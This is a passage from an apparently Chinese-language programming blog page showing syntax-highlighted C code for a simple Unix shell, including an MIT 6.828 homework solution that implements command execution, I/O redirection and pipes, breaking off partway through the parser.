<span class="keyword">if</span> (cmd2)</span><br><span class="line">        <span class="built_in">strcpy</span>(copy_cmd2, cmd2);</span><br><span class="line">    <span class="comment">// printf("%s\n%s\n", copy_cmd1, copy_cmd2);</span></span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];<span class="comment">//位置在创建子进程之前</span></span><br><span class="line">    pipe(fd);</span><br><span class="line">    <span class="keyword">char</span> *argv[max_argc];<span class="comment">//命令参数列表</span></span><br><span class="line">    <span class="keyword">char</span> *tmp_arg;<span class="comment">//切割字符串的临时变量</span></span><br><span class="line">    <span class="keyword">int</span> argc = <span class="number">0</span>;<span class="comment">//命令参数数量</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();<span class="comment">//创建子进程</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// execl("/bin/sh", "sh", "-c", command, NULL);</span></span><br><span class="line">        <span class="comment">// 分割cmd1字符串</span></span><br><span class="line">        tmp_arg = strtok(copy_cmd1, <span class="string">" "</span>);</span><br><span class="line">        argv[argc++] = tmp_arg;</span><br><span class="line">        <span class="keyword">while</span> (tmp_arg &amp;&amp; argc &lt;= max_argc) &#123;</span><br><span class="line">            tmp_arg = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">            argv[argc++] = tmp_arg;</span><br><span class="line">        &#125;</span><br><span class="line">        argv[argc] = <span class="literal">NULL</span>;<span class="comment">//将最后一项设置为NULL指针</span></span><br><span class="line">        <span class="comment">// 重定向至cmd2所指的文件</span></span><br><span class="line">        <span class="keyword">if</span> (cmd2) &#123;</span><br><span class="line">            dup2(fd[<span class="number">1</span>], <span class="number">1</span>); </span><br><span class="line">            <span class="built_in">close</span>(fd[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">close</span>(fd[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        execvp(argv[<span class="number">0</span>], argv);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); <span class="comment">// exec执行失败返回EXIT_FAILURE，执行成功这句就不执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//父进程</span></span><br><span class="line">        <span class="keyword">if</span> (cmd2) &#123;</span><br><span class="line">            dup2(fd[<span class="number">0</span>], <span class="number">0</span>); </span><br><span class="line">            <span class="built_in">close</span>(fd[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">close</span>(fd[<span class="number">1</span>]);</span><br><span class="line">            <span class="comment">// 分割cmd2字符串</span></span><br><span class="line">            tmp_arg = strtok(copy_cmd2, <span class="string">" "</span>);</span><br><span class="line">            argv[argc++] = tmp_arg;</span><br><span class="line">            <span class="keyword">while</span> (tmp_arg &amp;&amp; argc &lt;= max_argc) &#123;</span><br><span class="line">                tmp_arg = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">                argv[argc++] = tmp_arg;</span><br><span class="line">            &#125;</span><br><span class="line">            argv[argc] = <span class="literal">NULL</span>;<span class="comment">//将最后一项设置为NULL指针</span></span><br><span class="line">            execvp(argv[<span class="number">0</span>], argv);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//等待子进程结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//循环输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">        <span class="keyword">char</span> cmd[maxn];<span class="comment">//命令</span></span><br><span class="line">        <span class="comment">// gets(cmd);</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%[^\n]%*c"</span>, cmd);<span class="comment">//替代gets</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">"exit"</span>) == <span class="number">0</span>) &#123;<span class="comment">//终止sh</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysys(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MIT6.828 homework2：shell */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplifed xv6 shell.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// All commands have at least a type. Have looked at the type, the code</span></span><br><span class="line"><span class="comment">// typically casts the *cmd to some specific cmd type.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type;  <span class="comment">//  ' ' (exec), | (pipe), '&lt;' or '&gt;' for redirection</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 执行指令 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type;             <span class="comment">// ' '</span></span><br><span class="line">  <span class="keyword">char</span> *argv[MAXARGS];  <span class="comment">// arguments to the command to be exec-ed</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 重定向指令 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type;         <span class="comment">// &lt; or &gt;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">cmd</span>;</span>  <span class="comment">// the command to be run (e.g., an execcmd)</span></span><br><span class="line">  <span class="keyword">char</span> *file;       <span class="comment">// the input/output file</span></span><br><span class="line">  <span class="keyword">int</span> flags;        <span class="comment">// flags for open() indicating read or write</span></span><br><span class="line">  <span class="keyword">int</span> fd;           <span class="comment">// the file descriptor number to use for the file</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 管道指令 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipecmd</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type;           <span class="comment">// |</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">left</span>;</span>   <span class="comment">// left side of pipe</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">right</span>;</span>  <span class="comment">// right side of pipe</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork1</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">// Fork but exits on failure.</span></span><br><span class="line"><span class="function">struct cmd *<span class="title">parsecmd</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="comment">/* 执行指令 */</span></span><br><span class="line"><span class="comment">// Execute cmd.  Never returns.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runcmd</span><span class="params">(struct cmd *cmd)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> p[<span class="number">2</span>], r;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">ecmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipecmd</span> *<span class="title">pcmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> *<span class="title">rcmd</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cmd == <span class="number">0</span>) _exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd-&gt;type) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unknown runcmd\n"</span>);</span><br><span class="line">      _exit(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">      ecmd = (struct execcmd *)cmd;</span><br><span class="line">      <span class="keyword">if</span> (ecmd-&gt;argv[<span class="number">0</span>] == <span class="number">0</span>) _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//   fprintf(stderr, "exec not implemented\n");</span></span><br><span class="line">      <span class="comment">// Your code here ...</span></span><br><span class="line">      <span class="comment">/* 处理执行失败的指令 */</span></span><br><span class="line">      <span class="keyword">if</span> (execv(ecmd-&gt;argv[<span class="number">0</span>], ecmd-&gt;argv) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> mypath[<span class="number">20</span>] = <span class="string">"/bin/"</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(mypath, ecmd-&gt;argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (execv(mypath, ecmd-&gt;argv) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(mypath, <span class="string">"/usr/bin/"</span>); </span><br><span class="line">          <span class="built_in">strcat</span>(mypath, ecmd-&gt;argv[<span class="number">0</span>]);</span><br><span class="line">          <span class="keyword">if</span> (execv(mypath, ecmd-&gt;argv) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Command %s can't find\n"</span>, ecmd-&gt;argv[<span class="number">0</span>]);</span><br><span class="line">            _exit(<span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">    <span class="comment">// 利用fd的顺序增长的特性，使用close()关闭标准I/O的fd，然后open()打开目标文件，</span></span><br><span class="line">    <span class="comment">// 此时文件的fd就会自动替换我们关闭的标准I/O的fd，也就实现了重定向。</span></span><br><span class="line">      rcmd = (struct redircmd *)cmd;</span><br><span class="line">      <span class="built_in">close</span>(rcmd-&gt;fd);</span><br><span class="line">    <span class="comment">//   fprintf(stderr, "redir not implemented\n");</span></span><br><span class="line">      <span class="comment">// Your code here ...</span></span><br><span class="line">      <span class="comment">/* 处理重定向 */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">open</span>(rcmd-&gt;file, rcmd-&gt;flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH) &lt;</span><br><span class="line">          <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"file %s can't find\n"</span>, rcmd-&gt;file);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      runcmd(rcmd-&gt;cmd);<span class="comment">//递归</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">      pcmd = (struct pipecmd *)cmd;</span><br><span class="line">    <span class="comment">//   fprintf(stderr, "pipe not implemented\n");</span></span><br><span class="line">      <span class="comment">// Your code here ...</span></span><br><span class="line">      <span class="comment">/* 处理管道 */</span></span><br><span class="line">      <span class="keyword">if</span> (pipe(p) &lt; <span class="number">0</span>) &#123;<span class="comment">// 建立管道</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fail to create a pipe\n"</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 将child 1的标准输出作为child 2的标准输入</span></span><br><span class="line">      <span class="keyword">if</span> (fork1() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child 1:read from stdin(0), write to the right end of pipe(p[1])</span></span><br><span class="line">        <span class="built_in">close</span>(<span class="number">1</span>);<span class="comment">// 关闭标准输出</span></span><br><span class="line">        dup(p[<span class="number">1</span>]);<span class="comment">// 复制管道中fd</span></span><br><span class="line">        <span class="built_in">close</span>(p[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(p[<span class="number">1</span>]);</span><br><span class="line">        runcmd(pcmd-&gt;left);<span class="comment">//递归执行左侧命令</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fork1() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child 2:read from the left end of pipe(p[0]), write to stdout(1)</span></span><br><span class="line">        <span class="built_in">close</span>(<span class="number">0</span>);</span><br><span class="line">        dup(p[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(p[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(p[<span class="number">1</span>]);</span><br><span class="line">        runcmd(pcmd-&gt;right);<span class="comment">//递归执行右侧命令</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 关闭不需要的fd</span></span><br><span class="line">      <span class="built_in">close</span>(p[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">close</span>(p[<span class="number">1</span>]);</span><br><span class="line">      <span class="comment">// 等待两个子进程结束</span></span><br><span class="line">      wait(&amp;r);</span><br><span class="line">      wait(&amp;r);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取用户输入的命令 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getcmd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> nbuf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isatty(fileno(<span class="built_in">stdin</span>))) <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, nbuf);</span><br><span class="line">  <span class="keyword">if</span> (fgets(buf, nbuf, <span class="built_in">stdin</span>) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// EOF</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">"exit\n"</span>) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//添加退出命令</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd, r;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read and run input commands.</span></span><br><span class="line">  <span class="keyword">while</span> (getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">'c'</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="string">'d'</span> &amp;&amp; buf[<span class="number">2</span>] == <span class="string">' '</span>) &#123;</span><br><span class="line">      <span class="comment">// Clumsy but will have to do for now.</span></span><br><span class="line">      <span class="comment">// Chdir has no effect on the parent if run in the child.</span></span><br><span class="line">      buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;  <span class="comment">// chop \n</span></span><br><span class="line">      <span class="keyword">if</span> (chdir(buf + <span class="number">3</span>) &lt; <span class="number">0</span>) <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"cannot cd %s\n"</span>, buf + <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fork1() == <span class="number">0</span>) runcmd(parsecmd(buf)); <span class="comment">//创建一个shell进程的copy，并执行指令</span></span><br><span class="line">    wait(&amp;r); <span class="comment">//shell进入等待状态</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 新开进程 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork1</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">-1</span>) perror(<span class="string">"fork"</span>);</span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">execcmd</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line"></span><br><span class="line">  cmd = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  cmd-&gt;type = <span class="string">' '</span>;</span><br><span class="line">  <span class="keyword">return</span> (struct cmd *)cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">redircmd</span><span class="params">(struct cmd *subcmd, <span class="keyword">char</span> *file, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line"></span><br><span class="line">  cmd = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  cmd-&gt;type = type;</span><br><span class="line">  cmd-&gt;cmd = subcmd;</span><br><span class="line">  cmd-&gt;file = file;</span><br><span class="line">  cmd-&gt;flags = (type == <span class="string">'&lt;'</span>) ? O_RDONLY : O_WRONLY | O_CREAT | O_TRUNC;</span><br><span class="line">  cmd-&gt;fd = (type == <span class="string">'&lt;'</span>) ? <span class="number">0</span> : <span class="number">1</span>; <span class="comment">//判断重定向方向，方便后续关闭标准I/O的fd</span></span><br><span class="line">  <span class="keyword">return</span> (struct cmd *)cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">pipecmd</span><span class="params">(struct cmd *left, struct cmd *right)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipecmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line"></span><br><span class="line">  cmd = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="keyword">sizeof</span>(*cmd));</span><br><span class="line">  cmd-&gt;type = <span class="string">'|'</span>;</span><br><span class="line">  cmd-&gt;left = left;</span><br><span class="line">  cmd-&gt;right = right;</span><br><span class="line">  <span class="keyword">return</span> (struct cmd *)cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parsing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> whitespace[] = <span class="string">" \t\r\n\v"</span>;</span><br><span class="line"><span class="keyword">char</span> symbols[] = <span class="string">"&lt;|&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gettoken</span><span class="params">(<span class="keyword">char</span> **ps, <span class="keyword">char</span> *es, <span class="keyword">char</span> **q, <span class="keyword">char</span> **eq)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s;</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  s = *ps;</span><br><span class="line">  <span class="keyword">while</span> (s &lt; es &amp;&amp; <span class="built_in">strchr</span>(whitespace, *s)) s++;</span><br><span class="line">  <span class="keyword">if</span> (q) *q = s;</span><br><span class="line">  ret = *s;</span><br><span class="line">  <span class="keyword">switch</span> (*s) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">      s++;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">      s++;</span><br><span class="line">      <span 